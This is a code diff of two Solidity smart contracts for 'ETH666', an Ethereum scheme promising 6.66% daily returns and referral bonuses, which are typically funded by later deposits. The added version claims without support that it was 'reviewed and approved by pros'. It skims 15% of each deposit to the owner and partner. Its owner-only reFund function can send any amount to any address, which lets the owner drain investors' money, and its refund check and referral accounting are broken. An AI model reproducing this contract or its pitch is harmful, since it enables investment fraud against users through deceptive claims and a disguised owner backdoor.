@@ -1,159 +1,128 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ETH666 at 0xea96157b1dbf6612919dbd2b320fc86402e44318
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract eth666 at 0xbf91b27fec3146a1b36069f92337a0ea330725df
 */
-pragma solidity ^0.4.24;
+pragma solidity ^0.4.25;
 
-contract ETH666{
+/** 
+ * contract for eth666.me
+ * GAIN 6.66% PER 24 HOURS (every 5900 blocks)
+ * 
+ *  How to use:
+ *  1. Send any amount of ether to make an investment
+ *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
+ *  OR
+ *  2b. Send more ether to reinvest AND get your profit at the same time
+ *
+ * 
+ *  5% for every deposit of your direct partners
+ *  If you want to invite your partners to join our program ,They have to specify your ETH wallet in a "DATA" field during a deposit transaction.
+ * 
+ * 
+ * RECOMMENDED GAS LIMIT: 70000
+ * RECOMMENDED GAS PRICE: https://ethgasstation.info/
+ *
+ * Contract reviewed and approved by pros!
+**/
 
-    using SafeMath for uint256;
+contract eth666{
 
-    mapping(address => uint256) investments;
-    mapping(address => uint256) joined;
-    mapping(address => uint256) withdrawals;
-
-    uint256 public minimum = 10000000000000000;
-    uint256 public step = 666;
-    address public ownerWallet;
     address public owner;
+    address public partner;    
+    
+	mapping (address => uint256) deposited;
+	mapping (address => uint256) withdrew;
+	mapping (address => uint256) refearned;
+	mapping (address => uint256) blocklock;
 
-    event Invest(address investor, uint256 amount);
-    event Withdraw(address investor, uint256 amount);
-    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+	uint256 public totalDepositedWei = 0;
+	uint256 public totalWithdrewWei = 0;
+	uint256 public investorNum = 0;
+	
+	//if isStart = 0 !!!!DO NOT INVEST!!!! please wait for gameStart()
+	uint 	public isStart; 
 
-    /**
-     * @dev ?onstructor Sets the original roles of the contract
-     */
+	event invest(address indexed beneficiary, uint amount);
 
-    constructor() public {
-        owner = msg.sender;
-        ownerWallet = msg.sender;
+    constructor () public {
+        owner   = msg.sender;
+        partner = msg.sender;
+        isStart = 0;
     }
-
-    /**
-     * @dev Modifiers
-     */
-
-    modifier onlyOwner() {
-        require(msg.sender == owner);
+    
+    modifier onlyOwner {
+        require (msg.sender == owner, "OnlyOwner methods called by non-owner.");
         _;
+    }    
+    
+    //if you want to be a partner , contact admin
+    function setPartner(address newPartner) external onlyOwner {
+        partner = newPartner;
+    }
+ 
+ 	function gameStart(uint num) external onlyOwner{
+ 		isStart = num;
+ 	}
+
+	function() payable external {
+		emit invest(msg.sender,msg.value);
+		uint256 admRefPerc = msg.value / 10;
+		uint256 advPerc    = msg.value / 20;
+
+		owner.transfer(admRefPerc);
+		partner.transfer(advPerc);
+
+		if (deposited[msg.sender] != 0 && isStart != 0) {
+			address investor = msg.sender;
+            // calculate profit amount as such:
+            // amount = (amount invested) * 6.66% * (blocks since last transaction) / 5900
+            // 5900 is an average block count per day produced by Ethereum blockchain
+            uint256 depositsPercents = deposited[msg.sender] * 666 / 10000 * (block.number - blocklock[msg.sender]) /5900;
+			investor.transfer(depositsPercents);
+
+			withdrew[msg.sender] += depositsPercents;
+			totalWithdrewWei += depositsPercents;
+		} else if (deposited[msg.sender] == 0 && isStart != 0)
+			investorNum += 1;
+
+		address referrer = bytesToAddress(msg.data);
+		if (referrer > 0x0 && referrer != msg.sender) {
+			referrer.transfer(admRefPerc);
+			refearned[referrer] += advPerc;
+		}
+
+		blocklock[msg.sender] = block.number;
+		deposited[msg.sender] += msg.value;
+		totalDepositedWei += msg.value;
+	}
+	
+	//refund to user who misunderstood the game . 'withdrew' must = 0
+    function reFund(address exitUser, uint a) external onlyOwner {
+        uint256 c1 = withdrew[exitUser];
+        if(c1 == 0)
+          uint256 reFundValue = deposited[exitUser];
+          exitUser.transfer(a);
+          deposited[exitUser] = 0;
+    }
+    
+	function userDepositedWei(address _address) public view returns (uint256) {
+		return deposited[_address];
     }
 
-    /**
-     * @dev Allows current owner to transfer control of the contract to a newOwner.
-     * @param newOwner The address to transfer ownership to.
-     * @param newOwnerWallet The address to transfer ownership to.
-     */
-    function transferOwnership(address newOwner, address newOwnerWallet) public onlyOwner {
-        require(newOwner != address(0));
-        emit OwnershipTransferred(owner, newOwner);
-        owner = newOwner;
-        ownerWallet = newOwnerWallet;
+	function userWithdrewWei(address _address) public view returns (uint256) {
+		return withdrew[_address];
     }
 
-    /**
-     * @dev Investments
-     */
-    function () external payable {
-        require(msg.value >= minimum);
-        if (investments[msg.sender] > 0){
-            if (withdraw()){
-                withdrawals[msg.sender] = 0;
-            }
-        }
-        investments[msg.sender] = investments[msg.sender].add(msg.value);
-        joined[msg.sender] = block.timestamp;
-        ownerWallet.transfer(msg.value.div(100).mul(5));
-        emit Invest(msg.sender, msg.value);
+	function userDividendsWei(address _address) public view returns (uint256) {
+        return deposited[_address] * 666 / 10000 * (block.number - blocklock[_address]) / 5900;
     }
 
-    /**
-    * @dev Evaluate current balance
-    * @param _address Address of investor
-    */
-    function getBalance(address _address) view public returns (uint256) {
-        uint256 minutesCount = now.sub(joined[_address]).div(1 minutes);
-        uint256 percent = investments[_address].mul(step).div(10000);
-        uint256 different = percent.mul(minutesCount).div(1440);
-        uint256 balance = different.sub(withdrawals[_address]);
-
-        return balance;
+	function userReferralsWei(address _address) public view returns (uint256) {
+		return refearned[_address];
     }
 
-    /**
-    * @dev Withdraw dividends from contract
-    */
-    function withdraw() public returns (bool){
-        require(joined[msg.sender] > 0);
-        uint256 balance = getBalance(msg.sender);
-        if (address(this).balance > balance){
-            if (balance > 0){
-                withdrawals[msg.sender] = withdrawals[msg.sender].add(balance);
-                msg.sender.transfer(balance);
-                emit Withdraw(msg.sender, balance);
-            }
-            return true;
-        } else {
-            return false;
-        }
-    }
-
-    /**
-    * @dev Gets balance of the sender address.
-    * @return An uint256 representing the amount owned by the msg.sender.
-    */
-    function checkBalance() public view returns (uint256) {
-        return getBalance(msg.sender);
-    }
-
-    /**
-    * @dev Gets withdrawals of the specified address.
-    * @param _investor The address to query the the balance of.
-    * @return An uint256 representing the amount owned by the passed address.
-    */
-    function checkWithdrawals(address _investor) public view returns (uint256) {
-        return withdrawals[_investor];
-    }
-
-    /**
-    * @dev Gets investments of the specified address.
-    * @param _investor The address to query the the balance of.
-    * @return An uint256 representing the amount owned by the passed address.
-    */
-    function checkInvestments(address _investor) public view returns (uint256) {
-        return investments[_investor];
-    }
-
-}
-
-/**
- * @title SafeMath
- * @dev Math operations with safety checks that throw on error
- */
-library SafeMath {
-    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
-        if (a == 0) {
-            return 0;
-        }
-        uint256 c = a * b;
-        assert(c / a == b);
-        return c;
-    }
-
-    function div(uint256 a, uint256 b) internal pure returns (uint256) {
-        // assert(b > 0); // Solidity automatically throws when dividing by 0
-        uint256 c = a / b;
-        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
-        return c;
-    }
-
-    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
-        assert(b <= a);
-        return a - b;
-    }
-
-    function add(uint256 a, uint256 b) internal pure returns (uint256) {
-        uint256 c = a + b;
-        assert(c >= a);
-        return c;
-    }
+	function bytesToAddress(bytes bys) private pure returns (address addr) {
+		assembly {
+			addr := mload(add(bys, 20))
+		}
+	}
 }
